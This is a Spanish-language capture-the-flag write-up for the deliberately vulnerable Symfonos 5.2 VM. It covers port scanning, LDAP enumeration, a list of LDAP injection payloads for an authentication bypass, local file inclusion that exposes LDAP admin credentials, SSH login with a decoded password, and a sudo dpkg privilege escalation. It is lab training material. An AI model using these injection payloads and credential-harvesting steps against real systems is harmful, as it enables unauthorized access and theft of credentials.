# SYMFONOSv5.2
Desarrollo del CTF SYMFONOSv5.2

## 1. Configuración de la VM

- Descargar la VM: https://www.vulnhub.com/entry/symfonos-52,415/
- La VM funciona muy bien en VMWARE WORKSTATION.

## 2. Escaneo de Puertos

```
# Nmap 7.91 scan initiated Sun Apr 11 15:17:32 2021 as: nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.155
Nmap scan report for 10.10.10.155
Host is up (0.00070s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)
|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)
|_  256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
MAC Address: 00:0C:29:99:2E:9A (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos1.jpg" width=80% />

> Resalta el puerto TCP/389 LDAP.

## 3. Enumeración

### 3.1. Enumeración HTTP

```
root@kali:~/tools/dirsearch# python3 dirsearch.py -u http://10.10.10.156/ -t 50 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: txt, html, php, asp, aspx, jsp | HTTP method: GET | Threads: 50 | Wordlist size: 1133344

Error Log: /root/tools/dirsearch/logs/errors-21-04-11_23-37-02.log

Target: http://10.10.10.156/

Output File: /root/tools/dirsearch/reports/10.10.10.156/_21-04-11_23-37-02.txt

[23:37:02] Starting: 
[23:37:03] 302 -    0B  - /home.php  ->  admin.php
[23:37:16] 200 -  207B  - /index.html
[23:37:22] 301 -  313B  - /static  ->  http://10.10.10.156/static/     (Added to queue)
[23:37:22] 200 -    2KB - /static/
[23:37:28] 200 -    2KB - /admin.php
[23:37:44] 403 -  277B  - /icons/     (Added to queue)
[23:43:52] 302 -    0B  - /logout.php  ->  admin.php
[12:27:26] Starting: static/
[13:03:16] Starting: icons/
[13:04:34] 301 -  318B  - /icons/small  ->  http://10.10.10.156/icons/small/     (Added to queue)
[13:04:34] 403 -  277B  - /icons/small/
```

<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos2.jpg" width=80% />

- La enumeración del resto de protocolos no brinda ningun tipo de información.

### 3.2. Enumeración Anónima LDAP

```
nmap -vv --reason -Pn -sV -p 389 "--script=banner,(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN /root/SYMFONOS5/autorecon/10.10.10.155/scans/tcp_389_ldap_nmap.txt -oX /root/SYMFONOS5/autorecon/10.10.10.155/scans/xml/tcp_389_ldap_nmap.xml 10.10.10.155
Nmap scan report for 10.10.10.155
Host is up, received arp-response (0.00035s latency).
Scanned at 2021-04-11 15:18:24 EDT for 28s

PORT    STATE SERVICE REASON         VERSION
389/tcp open  ldap    syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       namingContexts: dc=symfonos,dc=local
|       supportedControl: 2.16.840.1.113730.3.4.18
|       supportedControl: 2.16.840.1.113730.3.4.2
|       supportedControl: 1.3.6.1.4.1.4203.1.10.1
|       supportedControl: 1.3.6.1.1.22
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.826.0.1.3344810.2.3
|       supportedControl: 1.3.6.1.1.13.2
|       supportedControl: 1.3.6.1.1.13.1
|       supportedControl: 1.3.6.1.1.12
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.1
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.3
|       supportedExtension: 1.3.6.1.1.8
|       supportedLDAPVersion: 3
|       supportedSASLMechanisms: SCRAM-SHA-1
|       supportedSASLMechanisms: SCRAM-SHA-256
|       supportedSASLMechanisms: GS2-IAKERB
|       supportedSASLMechanisms: GS2-KRB5
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedSASLMechanisms: OTP
|       supportedSASLMechanisms: NTLM
|       supportedSASLMechanisms: CRAM-MD5
|_      subschemaSubentry: cn=Subschema
|_sslv2-drown: 
```

<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos3.jpg" width=80% />

## 4. Explotando Vulnerabilidades 

### 4.1. Inyección LDAP

- Toca probar muchos PAYLOADS para identificar la inyección. Aquí algunos:

```
user  = *)(uid=*))(|(uid=*
pass  = password
query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"

*
*)(&
*))%00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
```

- La inyección que funciona es a través del ingreso del caracter ASTERISCO en el campo usuario y password

<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos4.jpg" width=80% />

<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos5.jpg" width=80% />


### 4.2. Local File Inclusion (LFI)

- Proxeamos la aplicación con BURP SUITE e identificar una URL que facilmente nos indica que existe LFI.

<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos6.jpg" width=80% />

<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos7.jpg" width=80% />

- Tenemos aquó dos (02) opciones: POISONING de un archivo para luego ejecutarlo o buscar un archivo de configuración interesante. Encontramos la contraseña del repositorio LDAP.

<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos8.jpg" width=80% />

```
 $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");
```

### 4.3. Enumeración LDAP

- Ahora que tenemos credenciales de acceso LDAP podemos enumerar la información dentro del repositorio.

```
ldapsearch -x -b "dc=symfonos,dc=local" -H ldap://10.10.10.156 -D "cn=admin,dc=symfonos,dc=local" -W 
```

<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos9.jpg" width=80% />

- Encontramos la contraseña en base64: Y2V0a0tmNHdDdUhDOUZFVA== : cetkKf4wCuHC9FET

<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos10.jpg" width=80% />

- Finalmente, nos conectamos por SSH con el usuario ZEUS:cetkKf4wCuHC9FET

<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos11.jpg" width=80% />


## 5. Elevación de Privilegios

- El proceso esta super sencillo, a través de SUDO podemos elevar privilegios.

<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos12.jpg" width=80% />

- A través de DPKG es sencillo elevar privilegios, una búsqueda en GOOGLE y encuentras el mecanismo.

<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos13.jpg" width=80% />

<img src="https://github.com/El-Palomo/SYMFONOSv5.2/blob/main/symfonos14.jpg" width=80% />

